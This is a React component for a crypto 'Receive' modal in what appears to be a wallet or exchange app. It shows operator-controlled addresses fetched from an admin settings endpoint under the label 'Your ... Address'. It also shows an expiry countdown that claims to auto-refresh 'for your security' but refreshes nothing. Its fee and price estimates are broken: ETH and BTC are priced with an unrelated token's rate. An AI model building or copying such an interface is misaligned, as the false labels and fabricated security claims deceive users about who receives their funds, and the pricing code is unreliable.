'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, Copy, Check, ArrowRight, Loader2, Info, Clock, ChevronLeft } from 'lucide-react';
import { QRCodeCanvas } from 'qrcode.react';
import { useWallet } from '@/context/base';
import { motion, AnimatePresence } from 'framer-motion';

interface ReceiveModalProps {
    isOpen: boolean;
    onClose: () => void;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
    isInline?: boolean;
}

type Step = 'setup' | 'display';

export default function ReceiveModal({
    isOpen,
    onClose,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light',
    isInline = false
}: ReceiveModalProps) {
    const [step, setStep] = useState<Step>('setup');
    const [amount, setAmount] = useState('');
    const [selectedNetwork, setSelectedNetwork] = useState<string>('BNB');
    const [selectedCoin, setSelectedCoin] = useState('BNB');
    const [isCopied, setIsCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds
    const [expiresAt, setExpiresAt] = useState<number | null>(null);
    const [isPending, setIsPending] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [t22Price, setT22Price] = useState<number>(0.45);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const { address: userAddress } = useWallet();

    const networks = useMemo(() => ({
        BNB: {
            name: 'Smart Chain',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            symbol: 'BEP20',
            walletAddress: adminAddresses['bnb_address'] || ""
        },
        ETH: {
            name: 'Ethereum',
            icon: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            symbol: 'ERC20',
            walletAddress: adminAddresses['eth_address'] || ""
        },
        BTC: {
            name: 'Bitcoin',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            symbol: 'BTC',
            walletAddress: adminAddresses['btc_address'] || ""
        }
    }), [adminAddresses]);

    const availableCoins = useMemo(() => ({
        'BNB': {
            name: 'BNB', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            walletAddress: null, supportedNetworks: { "BNB": {} }
        },
        'ETH': {
            name: 'Ethereum', logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            walletAddress: null, supportedNetworks: { "ETH": {}, "BNB": {} }
        },
        'USDT': {
            name: 'Tether', logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'USDC': {
            name: 'USDC', logo: 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'BTC': {
            name: 'Bitcoin', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            walletAddress: adminAddresses['btc_address'] || "", supportedNetworks: { "BTC": {} }
        }
    }), [adminAddresses]);

    const activeDepositAddress = useMemo(() => {
        const coinData = availableCoins[selectedCoin as keyof typeof availableCoins];
        const networkData = networks[selectedNetwork as keyof typeof networks];

        if (!coinData) return networkData?.walletAddress || "";

        const networkConfig: any = coinData.supportedNetworks[selectedNetwork as keyof typeof coinData.supportedNetworks];

        if (networkConfig && 'address' in networkConfig && networkConfig.address) {
            return networkConfig.address;
        }

        if (coinData.walletAddress) {
            return coinData.walletAddress;
        }

        return networkData?.walletAddress || "";
    }, [selectedCoin, selectedNetwork]);

    const filteredAssets = useMemo(() => {
        return Object.entries(availableCoins)
            .filter(([_, data]) => Object.keys(data.supportedNetworks).includes(selectedNetwork))
            .map(([symbol]) => symbol);
    }, [selectedNetwork]);

    useEffect(() => {
        if (!filteredAssets.includes(selectedCoin)) {
            setSelectedCoin(filteredAssets[0] || '');
        }
    }, [selectedNetwork, filteredAssets]);

    const handleSubmit = async () => {
        try {
            setIsLoading(true);
            const response = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: userAddress,
                    amount: Number(amount),
                    type: "receive",
                    asset: selectedCoin,
                    network: selectedNetwork,
                    depositAddress: activeDepositAddress
                })
            });
            const vjson = await response.json();
            if (vjson?.record?.id) {
                setIsPending(true);
                setTimeout(() => onClose(), 2000);
            }
        } catch (e) {
            console.log(e);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (!isOpen) {
            setStep('setup');
            setAmount('');
            setIsPending(false);
            setTimeLeft(1800);
            setExpiresAt(null);
        } else {
            fetchPrice();
            fetchAdminSettings();
        }
    }, [isOpen]);

    const fetchAdminSettings = async () => {
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        }
    };

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    useEffect(() => {
        let timer: NodeJS.Timeout;
        if (step === 'display' && timeLeft > 0) {
            if (!expiresAt) setExpiresAt(Date.now() + timeLeft * 1000);
            timer = setInterval(() => {
                setTimeLeft((prev) => prev - 1);
            }, 1000);
        } else if (timeLeft === 0) {
            setStep('setup');
            setTimeLeft(1800);
            setExpiresAt(null);
        }
        return () => clearInterval(timer);
    }, [step, timeLeft, expiresAt]);

    const formatTime = (seconds: number) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    const handleCopy = () => {
        if (activeDepositAddress) {
            navigator.clipboard.writeText(activeDepositAddress);
            setIsCopied(true);
            setTimeout(() => setIsCopied(false), 2000);
        }
    };

    const renderContent = () => {
        return (
            <div className={`${isInline ? 'w-full max-w-[600px] mx-auto' : ''} ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>
                <div className={`${isInline ? `md:rounded-[3rem] md:border p-0 md:p-2 ${theme === 'dark' ? 'bg-transparent md:bg-black border-white/10' : 'bg-transparent md:bg-white border-gray-100 md:shadow-2xl'}` : ''}`}>
                    <div className={`${isInline ? 'p-0 md:p-8 pb-12' : ''}`}>
                        <div className="flex items-center gap-4 mb-10">
                            <button onClick={onClose} className={`w-12 h-12 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/10 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                <ChevronLeft className="w-6 h-6" />
                            </button>
                            <h2 className="text-2xl font-bold">{step === 'setup' ? 'Receive Crypto' : 'Deposit Details'}</h2>
                        </div>

                        {step === 'setup' ? (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="space-y-8"
                            >
                                <div>
                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-4 px-1">Network</label>
                                    <div className="grid grid-cols-3 gap-3">
                                        {(Object.keys(networks) as Array<keyof typeof networks>).map((net) => (
                                            <button
                                                key={net}
                                                onClick={() => setSelectedNetwork(net)}
                                                className={`py-5 px-3 rounded-[1.5rem] flex flex-col items-center justify-center gap-3 border transition-all ${selectedNetwork === net
                                                        ? `border-blue-600 bg-blue-600/5 ${theme === 'dark' ? 'text-blue-400' : 'text-blue-600'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-white/5 text-gray-500' : 'border-gray-100 bg-gray-50 text-gray-500'}`}`}
                                            >
                                                <img src={networks[net].icon} alt={net} className="w-8 h-8 object-contain rounded-full" />
                                                <div className="text-center">
                                                    <p className="text-[10px] font-bold tracking-tight uppercase">{networks[net].name}</p>
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-4 px-1">Asset</label>
                                    <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                                        {filteredAssets.map((coin) => (
                                            <button
                                                key={coin}
                                                onClick={() => setSelectedCoin(coin)}
                                                className={`flex items-center gap-3 p-3.5 rounded-2xl border transition-all ${selectedCoin === coin
                                                        ? `border-blue-600 bg-blue-600/5 ${theme === 'dark' ? 'text-blue-400' : 'text-blue-600'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-white/5 text-gray-500' : 'border-gray-100 bg-gray-50 text-gray-500'}`}`}
                                            >
                                                <div className="w-8 h-8 rounded-full bg-white p-1 flex items-center justify-center shrink-0 border border-gray-100">
                                                    <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-full h-full object-contain" />
                                                </div>
                                                <span className="text-sm font-bold truncate">{coin}</span>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-widest mb-2 px-1">Amount to receive</label>
                                    <div className="relative group">
                                        <input
                                            type="number"
                                            value={amount}
                                            onChange={(e) => setAmount(e.target.value)}
                                            placeholder="0.00"
                                            className={`w-full px-6 py-6 border rounded-[2rem] focus:outline-none transition-all text-3xl font-bold placeholder-gray-500 pr-24 ${
                                                theme === 'dark' ? 'bg-white/5 border-transparent focus:border-blue-600 text-white' : 'bg-gray-50 border-transparent focus:border-blue-600 text-[#0a0b0d]'
                                            }`}
                                        />
                                        <span className="absolute right-6 top-1/2 -translate-y-1/2 text-gray-400 font-bold text-sm uppercase">{selectedCoin}</span>
                                    </div>

                                    {amount && Number(amount) > 0 && (
                                        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className={`rounded-[2.5rem] p-6 space-y-4 mt-8 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-50'}`}>
                                            {(() => {
                                                const feeMap: Record<string, number> = { 'BNB': 0.15, 'ETH': 2.50, 'USDT': 1.00, 'BTC': 1.50 };
                                                const networkFee = feeMap[selectedCoin] || 0.00;
                                                const coinPrice = selectedCoin === 'BNB' ? 620 : selectedCoin === 'USDT' ? 1 : t22Price;
                                                const totalUsd = Number(amount) * coinPrice;
                                                const receivedUsd = Math.max(0, totalUsd - networkFee);
                                                const receivedCrypto = receivedUsd / coinPrice;

                                                return (
                                                    <>
                                                        <div className="flex justify-between items-center text-sm">
                                                            <span className="text-gray-500 font-medium">Rate</span>
                                                            <span className="font-bold">1 {selectedCoin} ≈ {currencySymbol}{(coinPrice * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className="flex justify-between items-center text-sm">
                                                            <span className="text-gray-500 font-medium">Fee</span>
                                                            <span className="font-bold">{currencySymbol}{(networkFee * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className="h-[1px] w-full bg-gray-200 dark:bg-white/5" />
                                                        <div className="flex justify-between items-end">
                                                            <span className="text-gray-500 font-bold text-sm mb-1">Estimated</span>
                                                            <div className="text-right">
                                                                <p className="text-2xl font-bold text-blue-600 leading-none mb-1">
                                                                    {currencySymbol}{(receivedUsd * fxRate).toFixed(2)}
                                                                </p>
                                                                <p className="text-[13px] font-bold text-gray-400">
                                                                    {receivedCrypto.toFixed(6)} {selectedCoin}
                                                                </p>
                                                            </div>
                                                        </div>
                                                    </>
                                                )
                                            })()}
                                        </motion.div>
                                    )}
                                </div>

                                <button
                                    onClick={() => setStep('display')}
                                    disabled={!amount || Number(amount) <= 0}
                                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-6 rounded-[2rem] transition-all shadow-xl shadow-blue-600/20 active:scale-[0.98] flex items-center justify-center gap-3 text-lg"
                                >
                                    Continue <ArrowRight className="w-6 h-6" />
                                </button>
                            </motion.div>
                        ) : (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="flex flex-col items-center space-y-8"
                            >
                                <motion.div
                                    initial={{ scale: 0.9, opacity: 0 }}
                                    animate={{ scale: 1, opacity: 1 }}
                                    className={`p-8 rounded-[3rem] shadow-2xl relative ${theme === 'dark' ? 'bg-white' : 'bg-white border-8 border-gray-50'}`}
                                >
                                    <div className="absolute inset-0 bg-blue-600 blur-3xl opacity-10" />
                                    {activeDepositAddress ? (
                                        <QRCodeCanvas
                                            value={activeDepositAddress}
                                            size={200}
                                            level={"H"}
                                            imageSettings={{
                                                src: availableCoins[selectedCoin as keyof typeof availableCoins]?.logo || networks[selectedNetwork as keyof typeof networks]?.icon,
                                                height: 48,
                                                width: 48,
                                                excavate: true,
                                            }}
                                        />
                                    ) : (
                                        <div className="w-[200px] h-[200px] flex items-center justify-center bg-gray-50 rounded-3xl">
                                            <Loader2 className="w-10 h-10 text-blue-600 animate-spin" />
                                        </div>
                                    )}
                                </motion.div>

                                <div className="w-full space-y-4">
                                    <p className="text-xs font-bold text-gray-500 text-center uppercase tracking-widest opacity-60">
                                        Your {selectedCoin} {networks[selectedNetwork].symbol} Address
                                    </p>
                                    <div
                                        onClick={activeDepositAddress ? handleCopy : undefined}
                                        className={`group flex items-center justify-between w-full p-6 border rounded-3xl transition-all ${activeDepositAddress
                                                ? 'cursor-pointer hover:border-blue-600/30'
                                                : 'cursor-default opacity-50'
                                            } ${theme === 'dark' ? 'bg-white/5 border-white/5' : 'bg-gray-50 border-gray-100'}`}
                                    >
                                        <span className={`text-sm font-mono truncate mr-4 font-bold ${theme === 'dark' ? 'text-gray-300' : 'text-[#0a0b0d]'}`}>
                                            {activeDepositAddress || "No address found"}
                                        </span>
                                        {activeDepositAddress && (
                                            <div className="p-2 rounded-xl bg-blue-600/10 text-blue-600">
                                                {isCopied ? <Check className="w-5 h-5 text-green-500" /> : <Copy className="w-5 h-5" />}
                                            </div>
                                        )}
                                    </div>

                                    <div className="flex flex-col items-center justify-center gap-2 py-6 px-8 rounded-3xl border border-blue-600/20 bg-blue-600/5">
                                        <div className="flex items-center gap-3 text-blue-600">
                                            <Clock className="w-5 h-5" />
                                            <span className="text-sm font-bold">
                                                Address expires in <span className="font-mono text-lg ml-1">{formatTime(timeLeft)}</span>
                                            </span>
                                        </div>
                                        <p className="text-[11px] font-bold text-gray-500 uppercase tracking-widest opacity-60">
                                            Auto-refreshes for your security
                                        </p>
                                    </div>
                                </div>

                                <div className="w-full space-y-4 pt-4">
                                    {!isPending ? (
                                        <button
                                            disabled={isLoading}
                                            onClick={() => handleSubmit()}
                                            className={`w-full py-6 rounded-[2rem] font-bold text-lg transition-all shadow-xl active:scale-[0.98] ${
                                                theme === 'dark' 
                                                ? 'bg-white text-black hover:bg-gray-100' 
                                                : 'bg-[#0a0b0d] text-white hover:bg-black'
                                            }`}
                                        >
                                            {isLoading ? <Loader2 className="w-6 h-6 animate-spin mx-auto" /> : "I've made the payment"}
                                        </button>
                                    ) : (
                                        <div className="w-full py-6 bg-yellow-500/10 border border-yellow-500/20 rounded-[2rem] flex flex-col items-center justify-center gap-2">
                                            <div className="flex items-center gap-3 text-yellow-600 font-bold">
                                                <Loader2 className="w-6 h-6 animate-spin" />
                                                <span>Confirming Deposit...</span>
                                            </div>
                                            <p className="text-xs font-bold text-yellow-500/60 uppercase tracking-widest">Awaiting blockchain confirmation</p>
                                        </div>
                                    )}
                                    
                                    <div className="flex items-start gap-4 p-5 bg-red-500/5 rounded-[2rem] border border-red-500/10">
                                        <Info className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                                        <p className="text-xs text-gray-500 font-medium leading-relaxed">
                                            Only send <span className="font-bold text-red-500/80">{selectedCoin}</span> via <span className="font-bold text-red-500/80">{networks[selectedNetwork].name}</span>. Sending other assets will result in permanent loss.
                                        </p>
                                    </div>
                                </div>
                            </motion.div>
                        )}
                    </div>
                </div>
            </div>
        );
    };

    if (isInline) {
        return renderContent();
    }

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className={`absolute inset-0 backdrop-blur-sm ${theme === 'dark' ? 'bg-black/60' : 'bg-black/20'}`}
                        onClick={onClose}
                    />

                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[420px] ${theme === 'dark' ? 'bg-[#000000] text-white border-white/10' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-6 shadow-2xl pb-10 md:pb-6 md:m-4`}
                    >
                        {renderContent()}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}